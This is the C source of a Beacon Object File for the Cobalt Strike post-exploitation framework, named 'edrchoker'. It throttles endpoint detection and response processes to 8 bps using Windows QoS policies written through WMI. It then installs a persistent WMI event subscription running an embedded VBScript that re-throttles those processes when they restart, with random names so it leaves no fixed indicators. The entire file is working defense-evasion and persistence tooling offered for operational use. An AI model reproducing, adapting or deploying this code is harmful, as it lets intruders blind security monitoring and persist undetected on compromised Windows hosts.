/*
 * edrchoker.bof.c — Beacon Object File
 *
 * Throttle EDR processes to 8 bps via Windows QoS (pacer.sys).
 * Install a persistent WMI watchdog that re-throttles on process restart.
 *
 * MODES
 *   add        — throttle listed processes + install WMI watchdog
 *   remove     — restore specific process(es)
 *   remove_all — restore all + remove watchdog
 *   list       — show active policies and watchdog status
 *
 * COMPILE AS C, NOT C++
 *   mingw64: x86_64-w64-mingw32-gcc -O2 -o edrchoker.x64.o -c edrchoker.bof.c -masm=intel
 *   MSVC:    cl /c /TC /GS- /Foedrchoker.x64.obj edrchoker.bof.c
 *
 * BUG NOTE: never use = {0} on arrays in BOFs compiled with GCC at -O0.
 *   GCC emits a memset() CRT call for zero-initialisation of large arrays.
 *   memset is an unresolvable symbol in a BOF -> crash on entry.
 *   Fix: VirtualAlloc (always returns zeroed pages) for large buffers;
 *        explicit loop for anything small that must be zeroed.
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include <wbemidl.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(
    const IID*, LPUNKNOWN, DWORD, const IID*, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(
    IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD,
    RPC_AUTH_IDENTITY_HANDLE, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);

DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG*);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);

DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void*   WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);

/* ─── GUIDs ──────────────────────────────────────────────────────────────── */
static const CLSID g_CLSID_WbemLocator =
    {0x4590F811,0x1D3A,0x11D0,{0x89,0x1F,0x00,0xAA,0x00,0x4B,0x2E,0x24}};
static const IID g_IID_IWbemLocator =
    {0xDC12A687,0x737F,0x11CF,{0x88,0x4D,0x00,0xAA,0x00,0x4B,0x2E,0x24}};

/*
 * Watchdog VBScript — runs inside WmiPrvSE.exe when a watched process starts.
 * No child process, no dropped file. Re-throttles the process to 8 bps.
 *
 * ThrottleRateAction as "8" (VT_BSTR) — WMI rejects integer for uint64 property.
 * InstanceID set explicitly so ActiveStore is always targeted.
 * Removal is content-fingerprinted via Query containing "MSFT_NetQosPolicySettingData".
 */
static const wchar_t g_ScriptText[] =
    L"On Error Resume Next\n"
    L"Dim oSvc, oClass, oInst\n"
    L"Set oSvc   = GetObject(\"winmgmts:\\\\.\\ROOT\\StandardCimv2\")\n"
    L"Set oClass = oSvc.Get(\"MSFT_NetQosPolicySettingData\")\n"
    L"Set oInst  = oClass.SpawnInstance_\n"
    L"oInst.Name                     = \"ec_\" & TargetEvent.TargetInstance.Name\n"
    L"oInst.InstanceID               = oInst.Name & \"\\ActiveStore\"\n"
    L"oInst.AppPathNameMatchCondition = TargetEvent.TargetInstance.Name\n"
    L"oInst.ThrottleRateAction        = \"8\"\n"
    L"oInst.IPProtocolMatchCondition  = 3\n"
    L"oInst.NetworkProfile            = 0\n"
    L"oInst.Owner                     = \"machine\"\n"
    L"oSvc.PutInstance oInst\n";

/* Persistent LCG seed — zeroed by BOF loader (BSS) */
static DWORD g_randS = 0;

/* ─── String helpers ─────────────────────────────────────────────────────── */

static wchar_t* WNextTok(wchar_t** c) {
    wchar_t* s = *c;
    if (!s || !*s) return NULL;
    while (*s == L';') s++;
    if (!*s) { *c = s; return NULL; }
    wchar_t* p = s;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *c = p + 1; } else { *c = p; }
    return s;
}

static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
    while (*src && pos < max - 1) dst[pos++] = *src++;
    return pos;
}

static BOOL WContains(const wchar_t* hay, const wchar_t* needle) {
    if (!hay || !needle || !*needle) return FALSE;
    for (; *hay; hay++) {
        const wchar_t* a = hay; const wchar_t* b = needle;
        while (*a && *b && *a == *b) { a++; b++; }
        if (!*b) return TRUE;
    }
    return FALSE;
}

static void RandName(wchar_t* out, int n) {
    static const wchar_t pool[] =
        L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (!g_randS) g_randS = KERNEL32$GetTickCount() | 1;
    for (int i = 0; i < n; i++) {
        g_randS = g_randS * 1664525u + 1013904223u;
        out[i] = pool[(g_randS >> 16) % 62];
    }
    out[n] = L'\0';
}

/* ─── WMI property helpers ───────────────────────────────────────────────── */

static HRESULT PutBstr(IWbemClassObject* o, const wchar_t* p, const wchar_t* v) {
    VARIANT var; OLEAUT32$VariantInit(&var);
    var.vt = VT_BSTR; var.bstrVal = OLEAUT32$SysAllocString(v);
    HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
    OLEAUT32$VariantClear(&var); return hr;
}
static HRESULT PutByte(IWbemClassObject* o, const wchar_t* p, BYTE v) {
    VARIANT var; OLEAUT32$VariantInit(&var);
    var.vt = VT_UI1; var.bVal = v;
    HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
    OLEAUT32$VariantClear(&var); return hr;
}

static BOOL SpawnWmiInst(IWbemServices* svc, const wchar_t* cls,
                          IWbemClassObject** ppOut) {
    BSTR b = OLEAUT32$SysAllocString(cls);
    IWbemClassObject* pC = NULL;
    HRESULT hr = svc->lpVtbl->GetObject(svc, b, 0, NULL, &pC, NULL);
    OLEAUT32$SysFreeString(b);
    if (FAILED(hr)) return FALSE;
    hr = pC->lpVtbl->SpawnInstance(pC, 0, ppOut);
    pC->lpVtbl->Release(pC);
    return SUCCEEDED(hr);
}

/* ─── QoS helpers ────────────────────────────────────────────────────────── */

/* Write one policy instance into a specific WMI store */
static BOOL CreatePolicyInStore(IWbemServices* svc, const wchar_t* proc,
                                  const wchar_t* name, const wchar_t* store) {
    IWbemClassObject* pInst = NULL;
    if (!SpawnWmiInst(svc, L"MSFT_NetQosPolicySettingData", &pInst))
        return FALSE;

    /* instId = name + "\" + store  (e.g. "aBcDeFgH\ActiveStore") */
    wchar_t instId[48];
    int ip = 0;
    ip = WAppend(instId, ip, 48, name);
    ip = WAppend(instId, ip, 48, L"\\");
    ip = WAppend(instId, ip, 48, store);
    instId[ip] = L'\0';

    PutBstr(pInst, L"Name",                      name);
    PutBstr(pInst, L"InstanceID",                instId);
    PutBstr(pInst, L"AppPathNameMatchCondition",  proc);
    PutBstr(pInst, L"ThrottleRateAction",         L"8");   /* uint64 must be VT_BSTR */
    PutByte(pInst, L"IPProtocolMatchCondition",   3);
    PutByte(pInst, L"NetworkProfile",             0);
    PutBstr(pInst, L"Owner",                      L"machine");

    HRESULT hr = svc->lpVtbl->PutInstance(svc, pInst,
        WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pInst->lpVtbl->Release(pInst);
    return SUCCEEDED(hr);
}

/* Throttle proc: write to ActiveStore + PersistentStore, then verify */
static BOOL CreatePolicy(IWbemServices* svc, const wchar_t* proc) {
    wchar_t name[9]; RandName(name, 8);

    BOOL okA = CreatePolicyInStore(svc, proc, name, L"ActiveStore");
    BOOL okP = CreatePolicyInStore(svc, proc, name, L"PersistentStore");

    if (!okA && !okP) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] %S: PutInstance failed\n", proc);
        return FALSE;
    }

    /* Verify: GetObject on the ActiveStore InstanceID */
    wchar_t verifyPath[96];
    int vp = 0;
    vp = WAppend(verifyPath, vp, 96, L"MSFT_NetQosPolicySettingData.InstanceID=\"");
    vp = WAppend(verifyPath, vp, 96, name);
    vp = WAppend(verifyPath, vp, 96, L"\\ActiveStore\"");
    verifyPath[vp] = L'\0';

    BSTR bV = OLEAUT32$SysAllocString(verifyPath);
    IWbemClassObject* pChk = NULL;
    HRESULT hrV = svc->lpVtbl->GetObject(svc, bV, 0, NULL, &pChk, NULL);
    OLEAUT32$SysFreeString(bV);
    if (pChk) pChk->lpVtbl->Release(pChk);

    const wchar_t* sA; if (okA)           { sA = L"ok"; } else { sA = L"fail"; }
    const wchar_t* sP; if (okP)           { sP = L"ok"; } else { sP = L"fail"; }
    const wchar_t* sV; if (SUCCEEDED(hrV)) { sV = L"ok"; } else { sV = L"fail"; }

    BeaconPrintf(CALLBACK_OUTPUT,
        "  [+] %S -> '%S' active=%S persist=%S verify=%S\n",
        proc, name, sA, sP, sV);
    return okA || okP;
}

static void BuildRemoveWQL(wchar_t* out, int max, wchar_t* list) {
    int p = WAppend(out, 0, max,
        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ");
    wchar_t* c = list; wchar_t* tok; BOOL first = TRUE;
    while ((tok = WNextTok(&c)) != NULL) {
        if (!first) p = WAppend(out, p, max, L" OR ");
        p = WAppend(out, p, max, L"AppPathNameMatchCondition = '");
        p = WAppend(out, p, max, tok);
        if (p < max - 1) out[p++] = L'\'';
        first = FALSE;
    }
    out[p] = L'\0';
}

static int ExecDeleteQuery(IWbemServices* svc, const wchar_t* wql) {
    BSTR lang = OLEAUT32$SysAllocString(L"WQL");
    BSTR q    = OLEAUT32$SysAllocString(wql);
    IEnumWbemClassObject* en = NULL;
    HRESULT hr = svc->lpVtbl->ExecQuery(svc, lang, q,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
    OLEAUT32$SysFreeString(lang); OLEAUT32$SysFreeString(q);
    if (FAILED(hr) || !en) return 0;

    IWbemClassObject* obj = NULL; ULONG got = 0; int n = 0;
    while (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
        VARIANT vPath, vApp;
        OLEAUT32$VariantInit(&vPath); OLEAUT32$VariantInit(&vApp);
        obj->lpVtbl->Get(obj, L"__PATH",                    0, &vPath, NULL, NULL);
        obj->lpVtbl->Get(obj, L"AppPathNameMatchCondition", 0, &vApp,  NULL, NULL);
        if (vPath.vt == VT_BSTR && vPath.bstrVal &&
            SUCCEEDED(svc->lpVtbl->DeleteInstance(svc, vPath.bstrVal, 0, NULL, NULL))) {
            const wchar_t* sApp;
            if (vApp.vt == VT_BSTR && vApp.bstrVal) { sApp = vApp.bstrVal; } else { sApp = L"?"; }
            BeaconPrintf(CALLBACK_OUTPUT, "  [+] restored: %S\n", sApp);
            n++;
        }
        OLEAUT32$VariantClear(&vPath); OLEAUT32$VariantClear(&vApp);
        obj->lpVtbl->Release(obj);
    }
    en->lpVtbl->Release(en);
    return n;
}

/* ─── WMI watchdog ───────────────────────────────────────────────────────── */

static void BuildWatchWQL(wchar_t* out, int max, wchar_t* list) {
    int p = WAppend(out, 0, max,
        L"SELECT * FROM __InstanceCreationEvent WITHIN 5 "
        L"WHERE TargetInstance ISA 'Win32_Process' AND (");
    wchar_t* c = list; wchar_t* tok; BOOL first = TRUE;
    while ((tok = WNextTok(&c)) != NULL) {
        if (!first) p = WAppend(out, p, max, L" OR ");
        p = WAppend(out, p, max, L"TargetInstance.Name = '");
        p = WAppend(out, p, max, tok);
        if (p < max - 1) out[p++] = L'\'';
        first = FALSE;
    }
    if (p < max - 1) out[p++] = L')';
    out[p] = L'\0';
}

/* Install watchdog with fully random names (no fixed IOC strings).
 * Removal identifies the subscription by Query content, not by name. */
static void InstallSubscription(IWbemServices* sub, const wchar_t* wql) {
    wchar_t filterName[9];
    wchar_t consumerName[9];
    RandName(filterName,  8);
    RandName(consumerName, 8);

    IWbemClassObject* pFlt = NULL;
    if (!SpawnWmiInst(sub, L"__EventFilter", &pFlt)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] watchdog: __EventFilter unavailable\n");
        return;
    }
    PutBstr(pFlt, L"Name",           filterName);
    PutBstr(pFlt, L"QueryLanguage",  L"WQL");
    PutBstr(pFlt, L"Query",          wql);
    PutBstr(pFlt, L"EventNamespace", L"ROOT\\CIMV2");
    HRESULT hr = sub->lpVtbl->PutInstance(sub, pFlt,
        WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pFlt->lpVtbl->Release(pFlt);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] watchdog: PutInstance(filter) failed (0x%08X)\n", hr);
        return;
    }

    IWbemClassObject* pCsm = NULL;
    if (!SpawnWmiInst(sub, L"ActiveScriptEventConsumer", &pCsm)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] watchdog: ActiveScriptEventConsumer unavailable\n");
        return;
    }
    PutBstr(pCsm, L"Name",            consumerName);
    PutBstr(pCsm, L"ScriptingEngine", L"VBScript");
    PutBstr(pCsm, L"ScriptText",      g_ScriptText);
    hr = sub->lpVtbl->PutInstance(sub, pCsm, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pCsm->lpVtbl->Release(pCsm);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] watchdog: PutInstance(consumer) failed (0x%08X)\n", hr);
        return;
    }

    /* Build reference paths for the binding */
    wchar_t fRef[128];
    wchar_t cRef[160];
    int p;
    p = WAppend(fRef, 0, 128, L"\\\\.\\ROOT\\subscription:__EventFilter.Name=\"");
    p = WAppend(fRef, p, 128, filterName);
    if (p < 127) fRef[p++] = L'"'; fRef[p] = L'\0';

    p = WAppend(cRef, 0, 160,
        L"\\\\.\\ROOT\\subscription:ActiveScriptEventConsumer.Name=\"");
    p = WAppend(cRef, p, 160, consumerName);
    if (p < 159) cRef[p++] = L'"'; cRef[p] = L'\0';

    IWbemClassObject* pBnd = NULL;
    if (!SpawnWmiInst(sub, L"__FilterToConsumerBinding", &pBnd)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] watchdog: __FilterToConsumerBinding unavailable\n");
        return;
    }
    PutBstr(pBnd, L"Filter",   fRef);
    PutBstr(pBnd, L"Consumer", cRef);
    hr = sub->lpVtbl->PutInstance(sub, pBnd, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pBnd->lpVtbl->Release(pBnd);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] watchdog: PutInstance(binding) failed (0x%08X)\n", hr);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "  [+] watchdog: filter='%S' consumer='%S' binding=ok\n"
        "      WMI polls every 5s — EDR restart auto-throttled (ROOT\\subscription)\n",
        filterName, consumerName);
}

/*
 * Find and remove our watchdog by Query content fingerprint.
 * Enumerates __FilterToConsumerBinding, fetches each referenced filter,
 * and deletes any whose Query contains "MSFT_NetQosPolicySettingData".
 * Works regardless of the random names chosen at install time.
 */
static void RemoveSubscription(IWbemServices* sub) {
    BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
    BSTR query = OLEAUT32$SysAllocString(L"SELECT * FROM __FilterToConsumerBinding");
    IEnumWbemClassObject* en = NULL;
    sub->lpVtbl->ExecQuery(sub, lang, query,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
    OLEAUT32$SysFreeString(lang);
    OLEAUT32$SysFreeString(query);

    if (!en) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] watchdog: cannot enumerate bindings\n");
        return;
    }

    int nRemoved = 0;
    IWbemClassObject* bndObj = NULL;
    ULONG got = 0;
    while (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &bndObj, &got) == S_OK) {
        VARIANT vFilter, vConsumer, vPath;
        OLEAUT32$VariantInit(&vFilter);
        OLEAUT32$VariantInit(&vConsumer);
        OLEAUT32$VariantInit(&vPath);
        bndObj->lpVtbl->Get(bndObj, L"Filter",   0, &vFilter,   NULL, NULL);
        bndObj->lpVtbl->Get(bndObj, L"Consumer", 0, &vConsumer, NULL, NULL);
        bndObj->lpVtbl->Get(bndObj, L"__PATH",   0, &vPath,     NULL, NULL);

        if (vFilter.vt == VT_BSTR && vFilter.bstrVal) {
            /* Fetch the filter object and inspect its Query */
            IWbemClassObject* pFlt = NULL;
            sub->lpVtbl->GetObject(sub, vFilter.bstrVal, 0, NULL, &pFlt, NULL);
            if (pFlt) {
                VARIANT vQ;
                OLEAUT32$VariantInit(&vQ);
                pFlt->lpVtbl->Get(pFlt, L"Query", 0, &vQ, NULL, NULL);

                if (vQ.vt == VT_BSTR && WContains(vQ.bstrVal, L"MSFT_NetQosPolicySettingData")) {
                    /* Delete binding, then filter, then consumer */
                    if (vPath.vt == VT_BSTR && vPath.bstrVal)
                        sub->lpVtbl->DeleteInstance(sub, vPath.bstrVal, 0, NULL, NULL);
                    sub->lpVtbl->DeleteInstance(sub, vFilter.bstrVal, 0, NULL, NULL);
                    if (vConsumer.vt == VT_BSTR && vConsumer.bstrVal)
                        sub->lpVtbl->DeleteInstance(sub, vConsumer.bstrVal, 0, NULL, NULL);
                    nRemoved++;
                }

                OLEAUT32$VariantClear(&vQ);
                pFlt->lpVtbl->Release(pFlt);
            }
        }

        OLEAUT32$VariantClear(&vFilter);
        OLEAUT32$VariantClear(&vConsumer);
        OLEAUT32$VariantClear(&vPath);
        bndObj->lpVtbl->Release(bndObj);
    }
    en->lpVtbl->Release(en);

    if (nRemoved > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [+] watchdog removed (%d subscription(s))\n", nRemoved);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "  [-] watchdog: not found\n");
    }
}

/* Show all active QoS policies and watchdog status */
static void ListPolicies(IWbemServices* svc, IWbemServices* sub) {
    /* ── QoS policies (ROOT\StandardCimv2) ─────────────────────────────── */
    BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
    BSTR query = OLEAUT32$SysAllocString(
        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'");
    IEnumWbemClassObject* en = NULL;
    svc->lpVtbl->ExecQuery(svc, lang, query,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
    OLEAUT32$SysFreeString(lang);
    OLEAUT32$SysFreeString(query);

    int nPol = 0;
    if (en) {
        IWbemClassObject* obj = NULL; ULONG got = 0;
        while (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
            VARIANT vApp, vName, vInst;
            OLEAUT32$VariantInit(&vApp);
            OLEAUT32$VariantInit(&vName);
            OLEAUT32$VariantInit(&vInst);
            obj->lpVtbl->Get(obj, L"AppPathNameMatchCondition", 0, &vApp,  NULL, NULL);
            obj->lpVtbl->Get(obj, L"Name",                      0, &vName, NULL, NULL);
            obj->lpVtbl->Get(obj, L"InstanceID",                0, &vInst, NULL, NULL);

            const wchar_t* sApp;
            const wchar_t* sName;
            const wchar_t* sInst;
            if (vApp.vt  == VT_BSTR && vApp.bstrVal)  { sApp  = vApp.bstrVal;  } else { sApp  = L"?"; }
            if (vName.vt == VT_BSTR && vName.bstrVal) { sName = vName.bstrVal; } else { sName = L"?"; }
            if (vInst.vt == VT_BSTR && vInst.bstrVal) { sInst = vInst.bstrVal; } else { sInst = L"?"; }

            BeaconPrintf(CALLBACK_OUTPUT,
                "  [qos] %S  name='%S'  id='%S'\n", sApp, sName, sInst);
            nPol++;

            OLEAUT32$VariantClear(&vApp);
            OLEAUT32$VariantClear(&vName);
            OLEAUT32$VariantClear(&vInst);
            obj->lpVtbl->Release(obj);
        }
        en->lpVtbl->Release(en);
    }
    if (nPol == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] no active policies\n");
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker] %d QoS policy(s)\n", nPol);

    /* ── Watchdog status (ROOT\subscription) ────────────────────────────── */
    BSTR lang2  = OLEAUT32$SysAllocString(L"WQL");
    BSTR query2 = OLEAUT32$SysAllocString(L"SELECT * FROM __EventFilter");
    IEnumWbemClassObject* en2 = NULL;
    sub->lpVtbl->ExecQuery(sub, lang2, query2,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en2);
    OLEAUT32$SysFreeString(lang2);
    OLEAUT32$SysFreeString(query2);

    int nWd = 0;
    if (en2) {
        IWbemClassObject* obj = NULL; ULONG got = 0;
        while (en2->lpVtbl->Next(en2, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
            VARIANT vQ, vN;
            OLEAUT32$VariantInit(&vQ);
            OLEAUT32$VariantInit(&vN);
            obj->lpVtbl->Get(obj, L"Query", 0, &vQ, NULL, NULL);
            obj->lpVtbl->Get(obj, L"Name",  0, &vN, NULL, NULL);

            if (vQ.vt == VT_BSTR && WContains(vQ.bstrVal, L"MSFT_NetQosPolicySettingData")) {
                const wchar_t* sN;
                if (vN.vt == VT_BSTR && vN.bstrVal) { sN = vN.bstrVal; } else { sN = L"?"; }
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [watchdog] filter='%S' installed\n", sN);
                nWd++;
            }

            OLEAUT32$VariantClear(&vQ);
            OLEAUT32$VariantClear(&vN);
            obj->lpVtbl->Release(obj);
        }
        en2->lpVtbl->Release(en2);
    }
    if (nWd == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [watchdog] not installed\n");
    }
}

/* ─── WMI namespace connection ───────────────────────────────────────────── */

static IWbemServices* WmiConnect(IWbemLocator* loc, const wchar_t* ns) {
    IWbemServices* svc = NULL;
    BSTR b = OLEAUT32$SysAllocString(ns);
    HRESULT hr = loc->lpVtbl->ConnectServer(
        loc, b, NULL, NULL, 0L,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &svc);
    OLEAUT32$SysFreeString(b);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] WMI connect %S failed (0x%08X)\n", ns, hr);
        return NULL;
    }
    OLE32$CoSetProxyBlanket((IUnknown*)svc,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    return svc;
}

/* ─── Entry point ────────────────────────────────────────────────────────── */
/*
 * Args packed by CNA:  bof_pack($bid, "zz", cmd, process_list)
 *
 * "add"        → mode 0: throttle + install WMI watchdog
 * "remove"     → mode 1: restore specific process(es)
 * "remove_all" → mode 2: restore all QoS policies + remove watchdog
 * "list"       → mode 3: show active policies and watchdog status
 *
 * NOTE: bof_pack "Z" (UTF-16) is not supported in all CS versions.
 *       Use "z" (ASCII) and widen to wchar_t immediately on arrival.
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    int   cmdN = 0;
    char* cmdA = BeaconDataExtract(&parser, &cmdN);
    int   argN = 0;
    char* argA = BeaconDataExtract(&parser, &argN);

    /* widen cmd to wchar_t */
    wchar_t cmd[32];
    int ci = 0;
    if (cmdA) {
        for (; ci < 31 && cmdA[ci]; ci++)
            cmd[ci] = (wchar_t)(unsigned char)cmdA[ci];
    }
    cmd[ci] = L'\0';

    /* "add"        → 0  "remove" → 1
     * "remove_all" → 2  "list"   → 3  */
    LONG mode = 0;
    if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;
    if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;
    if (cmd[0] == L'l')                     mode = 3;

    const int PLEN = 2048;
    wchar_t* buf = (wchar_t*)KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)PLEN * sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] edrchoker: alloc failed\n");
        return;
    }
    if (argA && argN > 1) {
        int n = argN - 1;
        if (n >= PLEN) n = PLEN - 1;
        for (int i = 0; i < n; i++)
            buf[i] = (wchar_t)(unsigned char)argA[i];
    }

    /*
     * CoInitializeEx returns:
     *   S_OK    — we initialized COM (refcount 0→1). We own it.
     *   S_FALSE — COM already initialized by Beacon. Do NOT call CoUninitialize.
     *   FAILED  — serious error, abort.
     */
    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (hr != S_OK && hr != S_FALSE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] edrchoker: CoInitializeEx failed (0x%08X)\n", hr);
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        return;
    }
    BOOL coOwned = (hr == S_OK);

    IWbemLocator* pLoc = NULL;
    hr = OLE32$CoCreateInstance(&g_CLSID_WbemLocator, NULL,
        CLSCTX_INPROC_SERVER, &g_IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] edrchoker: CoCreateInstance failed (0x%08X)\n", hr);
        goto cleanup;
    }

    /* ── MODE 0: throttle + install watchdog ─────────────────────────────── */
    if (mode == 0) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker add \"proc1.exe;proc2.exe\"\n");
            goto release_loc;
        }

        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (!pSvc) goto release_loc;

        /*
         * WNextTok modifies in-place — use a separate copy for the throttle
         * loop so buf stays intact for BuildWatchWQL below.
         */
        wchar_t* tb = (wchar_t*)KERNEL32$VirtualAlloc(
            NULL, (SIZE_T)PLEN * sizeof(wchar_t),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        int ok = 0, fail = 0;
        if (tb) {
            KERNEL32$RtlMoveMemory(tb, buf, (SIZE_T)(PLEN - 1) * sizeof(wchar_t));
            wchar_t* c = tb; wchar_t* tok;
            while ((tok = WNextTok(&c)) != NULL) {
                if (CreatePolicy(pSvc, tok)) { ok++; } else { fail++; }
            }
            KERNEL32$VirtualFree(tb, 0, MEM_RELEASE);
        }
        int cbT;
        if (ok > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
        BeaconPrintf(cbT, "[edrchoker] throttle: %d ok, %d failed\n", ok, fail);
        pSvc->lpVtbl->Release(pSvc);

        /* Install watchdog — buf still intact (tb was the modified copy) */
        IWbemServices* pSub = WmiConnect(pLoc, L"ROOT\\subscription");
        if (pSub) {
            wchar_t* wql = (wchar_t*)KERNEL32$VirtualAlloc(
                NULL, 4096 * sizeof(wchar_t),
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (wql) {
                BuildWatchWQL(wql, 4096, buf);
                InstallSubscription(pSub, wql);
                KERNEL32$VirtualFree(wql, 0, MEM_RELEASE);
            }
            pSub->lpVtbl->Release(pSub);
        }

    /* ── MODE 1: restore specific processes ──────────────────────────────── */
    } else if (mode == 1) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker remove \"proc.exe\"\n");
            goto release_loc;
        }

        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (!pSvc) goto release_loc;

        wchar_t* wql = (wchar_t*)KERNEL32$VirtualAlloc(
            NULL, 2048 * sizeof(wchar_t),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (wql) {
            BuildRemoveWQL(wql, 2048, buf);
            int n = ExecDeleteQuery(pSvc, wql);
            KERNEL32$VirtualFree(wql, 0, MEM_RELEASE);
            int cbT;
            if (n > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
            BeaconPrintf(cbT, "[edrchoker] %d policy(s) removed\n", n);
        }
        pSvc->lpVtbl->Release(pSvc);

    /* ── MODE 2: restore all + remove watchdog ───────────────────────────── */
    } else if (mode == 2) {
        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (pSvc) {
            int n = ExecDeleteQuery(pSvc,
                L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'");
            BeaconPrintf(CALLBACK_OUTPUT,
                "[edrchoker] %d QoS policy(s) removed\n", n);
            pSvc->lpVtbl->Release(pSvc);
        }

        IWbemServices* pSub = WmiConnect(pLoc, L"ROOT\\subscription");
        if (pSub) {
            RemoveSubscription(pSub);
            pSub->lpVtbl->Release(pSub);
        }

    /* ── MODE 3: list active policies + watchdog status ──────────────────── */
    } else {
        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        IWbemServices* pSub = WmiConnect(pLoc, L"ROOT\\subscription");
        if (pSvc && pSub) {
            ListPolicies(pSvc, pSub);
        }
        if (pSvc) pSvc->lpVtbl->Release(pSvc);
        if (pSub) pSub->lpVtbl->Release(pSub);
    }

release_loc:
    pLoc->lpVtbl->Release(pLoc);
cleanup:
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
    if (coOwned) OLE32$CoUninitialize();
}
